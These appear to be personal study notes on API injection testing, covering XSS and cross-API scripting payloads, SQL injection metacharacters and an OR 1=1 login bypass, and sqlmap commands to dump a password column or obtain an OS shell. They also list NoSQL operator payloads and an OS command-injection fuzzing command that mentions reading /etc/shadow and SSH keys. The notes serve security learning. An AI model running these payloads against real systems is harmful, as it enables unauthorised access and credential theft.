Injection in general means to send an input, and this is executed by the API’s supporting technologies (such as the web application, database, or operating system running on the server), For this it's necesary:
- To know the tecnologies used on the application
- Patterns in response, like the verbose error “SQL Syntax Error”, that tell you that your input is being used to the data base 
You'll want **to test this** an all the user input that it's processed by the API
- API keys
- Tokens
-  Headers
- Query strings in the URL
- Parameters in POST/PUT requests

When you do come across a vulnerability, make sure to test every similar
endpoint for that vulnerability. because, if you find a weakness in
the /file/upload endpoint, all endpoints with an upload feature, such as
`/image/upload` and ``/account/upload``, have the same problem.

-----
#### XSS
XSS is when we can inject arbitrary JS code into an application
The XSS goal it's to find a request that interact with the front-end web application
Modern APIs defender treats this vulnerability damn well
Here are a few examples of XSS payloads:
```
<script>alert("xss")</script>
<script>alert(1);</script>
<%00script>alert(1)</%00script>
SCRIPT>alert("XSS");///SCRIPT>
```

Sometimes a web browser may protect from this by blacklisting those caracters, but in some cases it can be byppassed by doing something simple such as adding a null byte (%00) or capitalizing different letters will bypass web app protections. 

For API-specific XSS payloads, I highly recommend the following resources:

- Payload Box XSS payload list This list contains over 2,700 XSS scripts that could trigger a successful XSS attack (https://github.com/payloadbox/xss-payload-list).

- Wfuzz wordlist A shorter wordlist included with one of our primary tools. Useful for a quick check for XSS (https://github.com/xmendez/wfuzz/tree/master/wordlist).

- NetSec.expert XSS payloads Contains explanations of different XSS payloads and their use cases. Useful to better understand each payload and conduct more precise attacks (https://netsec.expert/posts/xss-in-2020).

-------
### Where to find it

An XSS is tipacally an input utilized to display that data in the web application.
Key point to look for are:
• Updating user profile information
• Updating social media “like” information
• Updating ecommerce store products
• Posting to forums or comment sections
Look for these and fuzz them.

-----

### Cross-API Scripting (XAS)
**XAS** is Cross-site-scripting on the apis.
So to perform this kind of attack the input should do something 
As **XAS** is a from of XSS you could try the same XSS payloads 

an **example of XAS**:
Imagine you got the *hAPI hacker* web this got a sidebar powered by a LinkedIn newsfed and you can update it. If the post comming from linkedin aren't sanitized you could to post one with XAS payload to see if it's triggering JS

#### XAS in third parti APIs
The XAS in third party APIs are cases when a provider’s API adds content or makes changes to its web application.

an **example third party XAS**:
Supposed you got the same hAPI hacker side bar which uses the city value to dinamically display it in a h3, so you send the fllowing request
```http
POST /api/profile/update HTTP/1.1
Host: hapihackingblog.com
Authorization: hAPI.hacker.token
Content-Type: application/json
{
"fname": "hAPI",
"lname": "Hacker",
"city": "<script>alert("xas")</script>"
}
```
You could try to change the content type header to `Content-Type: text/html`

--------

### SQLI
SQL Injection is one of the most known vulnerability and it occurs when an attacker could use the SQL backend system, this are the risk:

>"*With this access, an attacker could obtain or delete sensitive data such as credit card numbers, usernames, passwords, and other gems. In addition, an attacker could leverage SQL database functionality to bypass authentication and even gain system access*"


Nowadays the risk from this vulnerability had decreased significantly, so if you try many payload in a suspicious input you probably get banned quickly, so you want to take the system by surprise doing something that the developers didn't expect to:

>"*Try providing a string where a number is expected, a number where a string is expected, and a number or string where a Boolean value is expected. If an API is expecting a small number, send a large number, and if it expects a small string, send a large one*"

The idea from this is to cause the data base verbose error reveal something useful. But basically you always will need to find this user input that is interacting with the backend data base. We will see 2 different ways: **manual approach**, **automatizated approach**  

#### Manual approach
###### Manually Submitting Metacharacters
Metacharactes in SQL are characters that have special meaning on the SQL language

Here are some SQL metacharacters that can cause some issues: 
```
'
'' 
"" 
````
in SQL Quotes and single quotes are used to indicate the ending of the liner. Single and double quotes can be used to escape the current query to cause an error or to append your own SQL query.
```
;%00 
````
%00 could cause a verbose SQL-related error to be sent as a response
```
-- 
-- - 
````
The dashes (--) represent the beginning of a single-line comment.
```
;
' OR '1 
' OR 1 -- - 
" OR "" = " 
" OR 1 = 1 -- - 
' OR '' = '
OR 1=1
```
. The OR 1=1 is a conditional statement that literally means “or the following statement is true,” and it results in a true condition for the given SQL query.
###### Example
Imagine you got a backend where in the registration process do the following thing:
```
SELECT * FROM userdb WHERE username = 'hAPI_hacker' AND password = 'Password1!'
```
as the backend is doing this process with every registration in the user input, you could write the password that you want:
```
SELECT * FROM userdb WHERE username = 'hAPI_hacker' OR 1=1-- -
```
So this will always return true and then you could skip the password requirement. This example is extremely classic and possibly don't work in bug hunting as easy as that. 

#### Automatized approach

For this we save a burpsuite request in a file, such as `/home/hapihacker/burprequest1`. You can find SQL weakness by sending multiple SQL inputs and then analyzing the response looking for anomalous, like “The SQL database is unable to handle your request . . .” for example. So the one liner on **SQLmap** would look like this:
```
sqlmap -r /home/hapihacker/burprequest1 -p password
```
- **`-r` Option in SQLmap**:
    
    - The `-r` option in SQLmap allows you to provide a saved HTTP request file (from Burp Suite, for instance), instead of a URL. This request file contains all headers, parameters, and data SQLmap will use for its testing.
- **`-p` Parameter Option**:
    
    - `-p` specifies which parameter(s) to test for SQL injection (like `id`, `username`, or `password`). SQLmap will try SQL injection techniques on the specified parameters to see if it can get a SQL response. If you don't specify any parameter SQLmap will try every possibly parameter, which is time consuming.
###### More examples
Also you could use certain parameter to dump all the data 
```
sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –dump -T users -C password -D helpdesk
```
This example attempts to dump (`-dump`) the password column (`-C`) of the users table (`-T`)within the helpdesk database (`-D`).
Another interesting options worth to mention it are: 
- `os-shell`: Will attempt to upload SQL command access
- `os-pwm`: A powerful and more sophisticated shell

-------
### No-SQLI

No SQLI it's an umbrella term as refer to inject an injection from any database that isn't SQL.. This are example of commands.

```
$gt 
{"$gt":""} 
{"$gt":-1}
```
$gt is a MongoDB NoSQL query operator that selects documents that are **g**reater **t**han the provided value

```
$ne 
{"$ne":""} 
{"$ne":-1}
````
The $ne query operator selects documents where the value is not equal to the provided value

```
$nin 
{"$nin":1} 
{"$nin":[1]}
````
The $nin operator is the “not in” operator, used to select documents where the field value is not within the specified array
	
```
|| '1'=='1 
// 
||'a'\\'a 
'||'1'=='1';// 
'/{}: '"\;{} 
'"\/$[].> 
{"$where": "sleep(1000)"}
```
This others commands are meant to cause an error or waiting 10 seconds

**For examples check** [[Pixi]] [[crAPI]] [[no-SQLI_Portswigger_methodology]]

-----

### Comman injection
Last but not least, **Comand Injection** is when you can execute commans from the machine.
Here's some list of common commands:

| Operating system |  Command  | Description                             |
| :--------------: | :-------: | --------------------------------------- |
|   **Windows**    | ipconfig  | Shows the network configuration         |
|                  |    dir    | Prints the contents of a directory      |
|                  |    ver    | Prints the operating system and version |
|                  | echo %CD% | Prints the current working directory    |
|                  |  whoami   | Prints the current user                 |

|     Operating system     | Command  | Description                             |
| :----------------------: | :------: | --------------------------------------- |
| **nix (Linux and Unix)** | ifconfig | Shows the network configuration         |
|                          |    ls    | Prints the contents of a directory      |
|                          | uname -a | Prints the operating system and version |
|                          |   pwd    | Prints the current working directory    |
|                          |  whoami  | Prints the current user                 |

With **OS command injection** you could do many harmful things 
- You could retrieve SSH keys, the /etc/shadow

You could test the commands avaible by fuzzing it
```
wfuzz -z file,wordlists/commandsep.txt -z file,wordlists/os-cmds.txt http://vulnerableAPI
.com/api/users/query?=WFUZZWFUZ2Z
```
You cuold se more on [[OS_command_Portswigger_methodology]]